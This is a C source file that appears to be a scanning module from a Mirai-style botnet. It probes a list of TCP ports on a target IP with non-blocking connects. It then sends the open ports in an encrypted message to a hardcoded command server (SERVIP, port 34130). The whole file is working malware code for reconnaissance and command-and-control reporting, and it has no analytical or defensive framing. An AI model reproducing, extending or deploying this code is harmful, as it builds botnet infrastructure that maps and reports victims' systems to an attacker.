#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <arpa/inet.h>
#include <fcntl.h>

#include "includes.h"
#include "scan_ports.h"
#include "report.h"
#include "util.h"

#define SCAN_REPORT_PORT 34130
#define SCAN_MSG_TYPE 2

static void report_ports(ipv4_t ip, uint16_t *ports, int count)
{
    struct sockaddr_in addr;
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = SERVIP;
    addr.sin_port = htons(SCAN_REPORT_PORT);
    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return;
    }
    uint8_t buf[512];
    int pos = 0;
    uint8_t n = count > 255 ? 255 : count;
    buf[pos++] = SCAN_MSG_TYPE;
    *(uint32_t *)(buf + pos) = ip;
    pos += 4;
    buf[pos++] = n;
    for (int i = 0; i < n; i++) {
        *(uint16_t *)(buf + pos) = htons(ports[i]);
        pos += 2;
    }
    report_send_encrypted(fd, buf, pos);
    close(fd);
}

void scan_ports_run(ipv4_t target_ip, const char *port_list)
{
    uint16_t ports[64];
    int nports = 0;
    char buf[256];
    util_strcpy(buf, port_list);
    char *p = buf;
    while (*p && nports < 64) {
        char *end = p;
        while (*end && *end != ',' && *end != ' ') end++;
        if (*end) *end++ = 0;
        int port = util_atoi(p, 10);
        if (port > 0 && port <= 65535)
            ports[nports++] = (uint16_t)port;
        p = end;
    }
    if (nports == 0) return;
    uint16_t open[64];
    int nopen = 0;
    struct sockaddr_in dst;
    dst.sin_family = AF_INET;
    dst.sin_addr.s_addr = target_ip;
    for (int i = 0; i < nports && nopen < 64; i++) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        fcntl(fd, F_SETFL, O_NONBLOCK | fcntl(fd, F_GETFL, 0));
        dst.sin_port = htons(ports[i]);
        connect(fd, (struct sockaddr *)&dst, sizeof(dst));
        struct timeval tv = {2, 0};
        fd_set wfds;
        FD_ZERO(&wfds);
        FD_SET(fd, &wfds);
        if (select(fd + 1, NULL, &wfds, NULL, &tv) > 0) {
            int err;
            socklen_t len = sizeof(err);
            if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &len) == 0 && err == 0)
                open[nopen++] = ports[i];
        }
        close(fd);
    }
    if (nopen > 0)
        report_ports(target_ip, open, nopen);
}
